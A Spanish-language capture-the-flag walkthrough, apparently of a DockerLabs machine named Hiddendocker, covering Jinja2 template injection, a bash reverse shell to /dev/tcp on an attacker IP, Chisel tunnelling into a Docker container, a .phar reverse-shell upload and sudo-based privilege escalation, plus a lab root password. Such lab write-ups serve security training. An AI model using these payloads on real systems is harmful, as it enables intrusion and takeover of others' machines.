Escaneo de puertos:

![](../../../Images/Pasted%20image%2020240814210234.png)

Veamos lo que hay en el puerto 5000:

![](../../../Images/Pasted%20image%2020240814210321.png)

Tenemos un formulario para registrarnos a una página

Escribimos cualquier cosa, por ejemplo:

![](../../../Images/Pasted%20image%2020240814210725.png)

Y nos aparece

![](../../../Images/Pasted%20image%2020240814210736.png)

Justo lo que colocamos en el nombre

Entonces evidenciamos que la página web está hecha en Flask de Python, por ende explotaremos una STTI (Server Side Template Injection). Accederemos a la siguiente pagina y nos copiaremos este comando:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection

![](../../../Images/Pasted%20image%2020240814211729.png)

Lo pegamos con el comando whoami:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```

![](../../../Images/Pasted%20image%2020240814211800.png)

Y nos arroja:

![](../../../Images/Pasted%20image%2020240814211811.png)

Que detrás de la página está el usuario pepinodemar

Entonces ahora meteremos un comando de reverse shell y nos pondremos a la escucha con Netcat:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/192.168.1.232/443 0>&1"').read() }}
```

![](../../../Images/Pasted%20image%2020240814212004.png)

![](../../../Images/Pasted%20image%2020240814212018.png)

Y listo, estamos dentro de la máquina víctima

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020240814212056.png)

![](../../../Images/Pasted%20image%2020240814212114.png)

Flag de user:

![](../../../Images/Pasted%20image%2020240814212131.png)

## ESCALADA DE PRIVILEGIOS

Ejectutando el comando Hostname -I, nos damos cuenta que tenemos un contenedor en docker:

![](../../../Images/Pasted%20image%2020240815081022.png)

Entonces vamos a sacar este contenedor para poder acceder a él desde mi kali, usaré la herramienta de Chisel. 
Le compartiré Chisel a la máquina y le daremos permisos de ejecución:

![](../../../Images/Pasted%20image%2020240815082830.png)

![](../../../Images/Pasted%20image%2020240815082851.png)

Ahora ya que tenemos Chisel en ambos lugares (la máquina y mi kali), me pondré a la  escucha desde mi kali:
```
./chisel server --reverse -p 1234
```

![](../../../Images/Pasted%20image%2020240815083031.png)

Ahora crearemos el túnel desde la máquina para poder enviar el contenedor:
```
./chisel client 192.168.1.232:1234 R:socks
```

![](../../../Images/Pasted%20image%2020240815083216.png)

Y ahora por el puerto 1080 se abrió el túnel:

![](../../../Images/Pasted%20image%2020240815083250.png)

Ahora dentro del navegador colocaremos el proxy:

![](../../../Images/Pasted%20image%2020240815083440.png)

Ahora sí intentamos acceder a el contenedor por el puerto 80:

![](../../../Images/Pasted%20image%2020240815083504.png)

Y tenemos conexión gracias al túnel creado con Chisel

Ahora para no tener problemas al usar nuestras herramientas apuntando hacia este contenendor editaremos el archivo /etc/proxychains4.conf, le pondremos el puerto por el cual corre nuestro túnel:

![](../../../Images/Pasted%20image%2020240815084716.png)

Ahora si, haremos un escaneo de puertos siempre colocando el comando Proxychains antes de cualquier herramienta que apunte hacia el contenedor que pasa por el túnel:

![](../../../Images/Pasted%20image%2020240815084805.png)

Haremos fuzzing web a este puerto 80 con Gobuster proxy:
```
proxychains gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,php.bak --proxy socks5://127.0.0.1:1080
```

![](../../../Images/Pasted%20image%2020240815085417.png)

Nos encontró /machine.php, accedemos a este directorio:

![](../../../Images/Pasted%20image%2020240815085431.png)

Tenemos un panel de subida de archivos, subiremos una RevShell en formato .phar:

![](../../../Images/Pasted%20image%2020240815085809.png)

![](../../../Images/Pasted%20image%2020240815085829.png)

![](../../../Images/Pasted%20image%2020240815085836.png)

Ahora localizaremos donde se subió exactamente nuestro archivo, usaremos Dirb:

![](../../../Images/Pasted%20image%2020240815084930.png)

Tenemos un /uploads, accedamos a el:

![](../../../Images/Pasted%20image%2020240815085917.png)

Nos pondremos a la escucha con Netcat y daremos click en el archivo:

![](../../../Images/Pasted%20image%2020240815085944.png)

Y recibimos la  conexión, ahora estamos dentro de la máquina del contenedor

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020240815090131.png)

![](../../../Images/Pasted%20image%2020240815090149.png)

## ESCALADA DE PRIVILEGIOS #2

Ejecutamos sudo -l para ver el binario que podremos usar:

![](../../../Images/Pasted%20image%2020240815090348.png)

Miramos en GTFOBins como podemos escalar con estos binarios:

![](../../../Images/Pasted%20image%2020240815090436.png)

![](../../../Images/Pasted%20image%2020240815090448.png)

En el directorio /opt nos encontramos una nota que dice:

![](../../../Images/Pasted%20image%2020240815090315.png)

Así que para poder leer esa clave de ese archivo .txt podemos usar cualquiera de los 2 binarios, ejecutamos un binario y la clave es:

![](../../../Images/Pasted%20image%2020240815090752.png)

La contraseña de root es dockerlabsmolamogollon123

Escalamos a root con esta contraseña:

![](../../../Images/Pasted%20image%2020240815090823.png)

Y listo, ya somos root pero en la máquina del contenedor

Ahora seremos root desde la máquina Hiddendocker con la contraseña encontrada:

![](../../../Images/Pasted%20image%2020240815091234.png)

Y listo, ya somos ROOT

Flag de root:

![](../../../Images/Pasted%20image%2020240815091257.png)

